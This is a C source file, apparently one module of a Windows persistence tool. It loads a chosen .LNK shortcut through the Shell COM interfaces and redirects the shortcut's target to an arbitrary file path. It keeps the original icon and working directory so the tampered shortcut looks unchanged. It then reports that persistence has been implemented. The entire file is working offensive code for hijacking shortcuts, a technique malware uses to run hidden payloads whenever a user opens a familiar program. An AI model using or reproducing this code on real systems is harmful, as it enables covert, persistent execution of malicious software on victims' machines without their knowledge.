#include "persys.h"

BOOL				setTargetToLNK(wchar_t* path, S_args* params)
{
	IShellLink* psl;
	IPersistFile* ppf;
	HRESULT hr;
	WORD wsz[MAX_PATH];
	char origPath[MAX_PATH];
	char pszDir[MAX_PATH];
	int piIcon;
	HRESULT	COMInit = CoInitialize(NULL);

	hr = CoCreateInstance(
		&CLSID_ShellLink,
		NULL,
		CLSCTX_INPROC_SERVER,
		&IID_IShellLinkW,
		&psl);
	if (SUCCEEDED(hr))
	{
		hr = psl->lpVtbl->QueryInterface(psl, &IID_IPersistFile, &ppf);
		if (SUCCEEDED(hr))
		{
			hr = ppf->lpVtbl->Load(ppf, path, STGM_READWRITE);
			if (SUCCEEDED(hr))
			{
				printf("\n[i] LNK file successfully loaded.\n");
				memset(origPath, 0, MAX_PATH);
				memset(pszDir, 0, MAX_PATH);
				psl->lpVtbl->GetPath(psl, origPath, MAX_PATH, NULL,
					SLGP_RAWPATH);
				psl->lpVtbl->GetWorkingDirectory(psl, pszDir, MAX_PATH);
				psl->lpVtbl->SetPath(psl, (LPCSTR)params->filePath);
				psl->lpVtbl->SetIconLocation(psl, origPath, 0);
				psl->lpVtbl->SetWorkingDirectory(psl, pszDir);
				hr = ppf->lpVtbl->Save(ppf, path, TRUE);
				if (SUCCEEDED(hr))
					printf("[i] Persistence successfully implemented to the "\
						"target LNK file.\n\n");
				else
					return FALSE;
			}
			ppf->lpVtbl->Release(ppf);
		}
		psl->lpVtbl->Release(psl);
	}
	if (hr != S_OK)
		return FALSE;
	return TRUE;
}

BOOL		checkLnkPath(wchar_t* buffer, S_args* params)
{
	DWORD fileAttr;

	buffer[wcslen(buffer) - 1] = '\0';
	fileAttr = GetFileAttributesW(buffer);
	if ((fileAttr == INVALID_FILE_ATTRIBUTES) ||
		(fileAttr == FILE_ATTRIBUTE_DIRECTORY))
	{
		printf("\nError : invalid path.\nEnter the "\
			"path of the LNK file or 'quit' to quit the module.\n\n");
		return FALSE;
	}
	return (setTargetToLNK(buffer, params));
}

void		ShortcutModif(S_args* params)
{
	wchar_t	buffer[MAX_PATH];
	BOOL persistence_ok = FALSE;

	wmemset(buffer, 0, MAX_PATH);
	printf("[*] Starting ShortcutModif module...\n");
	while (wcsicmp(buffer, L"quit\n") != 0 &&
		persistence_ok == FALSE)
	{
		wmemset(buffer, 0, MAX_PATH);
		printf("LNK Path> ");
		fgetws(buffer, MAX_PATH, stdin);
		if (wcsicmp(buffer, L"\n") != 0 && wcsicmp(buffer, L"quit\n") != 0)
		{
			if (wcsicmp(buffer, L"help\n") == 0)
				printf("\n- Enter the path of the LNK file\n"\
					"- Type 'quit' to quit this module\n\n");
			else
				persistence_ok = checkLnkPath(buffer, params);
		}
	}
}